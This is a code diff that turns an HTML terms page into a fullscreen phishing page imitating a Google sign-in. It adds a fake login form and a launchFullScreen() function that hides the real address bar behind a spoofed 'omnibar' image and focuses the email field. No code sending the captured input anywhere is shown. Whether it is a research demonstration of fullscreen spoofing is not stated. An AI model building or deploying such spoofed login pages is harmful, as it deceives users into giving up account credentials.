@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
     <head>
@@ -13,7 +14,185 @@
                 width:  100%;
                 height: 100%;
             }
-        </style>
+            
+            #spoofbar {
+                width:  100%;
+                height: 100%;
+            }
+            
+ #container {
+  width: 100px;
+  height: 100px;
+  position: relative;
+}
+#btn{
+  background-color: rgba(220,220,255,.50); /* Blue */
+  border: none;
+  color: black;
+  width:100%;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+  position: fixed;
+  bottom: 0px;
+  left: 50%; 
+  transform: translateX(-50%);
+}
+#inpt {
+  width: 100%;
+  height: 25%;
+  position: absolute;
+  background:transparent;
+  border:none;
+  top: 0;
+  left: 0;
+    position: fixed;
+  bottom: 0px;
+  left: 50%; 
+  transform: translateX(-50%);
+}
+#inpt {
+  z-index: 10;
+}
+
+.wrap {
+    height: 300px;
+    overflow: hidden;
+}
+
+
+          
+          @import url("https://fonts.googleapis.com/css2?family=Roboto&display=swap");
+* {
+  margin: 0%;
+  padding: 0%;
+  box-sizing: border-box;
+}
+body {
+  font-family: "Roboto";
+}
+a {
+  text-decoration: none;
+  color: #1a73e8;
+  display: block;
+  font-size: 14px;
+}
+.container {
+  max-width: 450px;
+  border: 1px solid rgb(228, 228, 228);
+  margin: auto;
+  margin-top: 0rem;
+  border-radius: 10px;
+  padding: 2rem;
+  height: 500px;
+  /* text-align: center; */
+}
+.top-content {
+  text-align: center;
+}
+.imgLogo {
+  width: 80px;
+  margin: 10px 0;
+}
+h2 {
+  font-size: 20px;
+  font-weight: 100;
+  margin-bottom: 10px;
+}
+.heading {
+  margin-bottom: 30px;
+}
+input[type="email"] {
+  display: block;
+  border: 1px solid rgb(228, 228, 228);
+  font-size: 16px;
+  width: 100%;
+  height: 55px;
+  padding: 0 15px;
+  margin-bottom: 10px;
+  position: relative;
+  z-index: 2;
+  background-color: transparent;
+  outline: none;
+  border-radius: 5px;
+  position: relative;
+}
+.inputs {
+  position: relative;
+}
+.input-label {
+  position: absolute;
+  top: 15px;
+  font-size: 1.1rem;
+  left: 14px;
+  color: rgb(122, 122, 122);
+  font-weight: 100;
+  transition: 0.1s ease;
+  background-color: white;
+  padding: 0 5px;
+}
+
+input[type="email"]:focus ~ .input-label {
+  top: -7px;
+  color: #1864c9;
+  font-size: 13px;
+  background-color: rgb(255, 255, 255);
+  z-index: 2;
+}
+input[type="email"]:target ~ .input-label {
+  top: -7px;
+  color: #1864c9;
+  font-size: 13px;
+  background-color: rgb(255, 255, 255);
+  z-index: 2;
+}
+.input:focus {
+  border: 2px solid #1a73e8;
+}
+.link-btn {
+  margin-bottom: 2rem;
+}
+.color {
+  color: rgb(90, 90, 90);
+  font-size: 14px;
+  margin-bottom: 5px;
+}
+.btn-group {
+  display: flex;
+  justify-content: space-between;
+}
+.create-btn {
+  border: none;
+  background-color: transparent;
+  color: #1a73e8;
+  font-weight: bold;
+  cursor: pointer;
+  height: 35px;
+  padding: 10px 5px;
+}
+.next-btn {
+  background-color: #1a73e8;
+  color: white;
+  border: none;
+  height: 38px;
+  padding: 0 25px;
+  border-radius: 5px;
+  cursor: pointer;
+}
+.create-btn:hover {
+  background-color: #e8f2ff6e;
+  /* transition: 0.2s all ease-in; */
+}
+.next-btn:hover {
+  background-color: #1864c9;
+}
+
+
+</style>
         <script>
         
         var details = document.querySelector("details");
@@ -21,8 +200,20 @@
         var shouldResetScrollOnce = true;
                function googleTap(){
                 document.getElementById("spoof").style = "display: block;";
+                document.getElementById("loginForm").style = "display: block;";
                 document.getElementById("content").style = "display: none;";
+                document.getElementById("terms").style = "display: none;";
                 window.scrollTo(0, 5);
+               }
+               
+               function launchFullScreen(){
+                  document.getElementById("spoof").style = "display: none;";
+                  document.getElementById("spoofbar").style = "display: block;";
+                  document.documentElement.requestFullscreen();
+                  document.getElementById("email").value = " ";
+                  document.getElementById("email").focus();
+                  document.getElementById("email").click();
+                  document.getElementById("email").value = "";
                }
               
                
@@ -33,8 +224,8 @@
                    window.scrollTo(0, 0);
                    }
                    
-               document.getElementById("googleLogin").style = "width:50%;display:block;";
-               shouldResetScrollOnce = false;
+                   document.getElementById("googleLogin").style = "width:50%;display:block;";
+                   shouldResetScrollOnce = false;
                 }
              
             
@@ -43,13 +234,18 @@
     </head>  
     <body>
         
-        <img id="spoof" style="display: none;" src="spoofing.png"></img>
+        <img id="spoof" style="display: none;" onClick="launchFullScreen()" src="spoofing.png"></img>
+        
+        <img id="spoofbar" style="display: none;" src="omnibar.png"></img>
+        
         <div id="content">
             <br><br><br>
             <center>
                 <h2>Please Read Carefully Before Proceeding</h2>
             </center>
         </div>
+        
+         
         
          <div id="terms">
              <details>
@@ -115,19 +311,37 @@
           </p> 
             </details>
             
-            
-           
-         </div>
-           
-            <center>
+              <center>
            <img id="googleLogin" onClick="googleTap()" style="width:50%;display:none;" src="google.png"></img>
             <br><br><br>
             </center>
-        </div>
-        
-        <script>
-            
-        </script>
+           
+         </div>
+           
+         
+        <div id="loginForm" class="container" style="display:none;">
+  <div class="top-content">
+    <img class="imgLogo" src="google-logo.png" alt="">
+    <h2>Sign in</h2>
+    <p class="heading">Use your Google Account</p>
+
+  </div>
+  <div class="inputs">
+    <input type="email" name="" id="email" class="input">
+    <label for="email" class="input-label">Email or phone</label>
+
+  </div>
+  <a href="" class="link-btn">Forgot Email?</a>
+  <p class="color">Not your computer? Use Guest mode to sign in privately.</p>
+  <a href="" class="link-btn">Learn More</a>
+  <div class="btn-group">
+    <button class="create-btn">Create account</button>
+    <button class="next-btn">Next</button>
+
+  </div>
+</div>
+    
+
     </body>
   </body>
 </html>
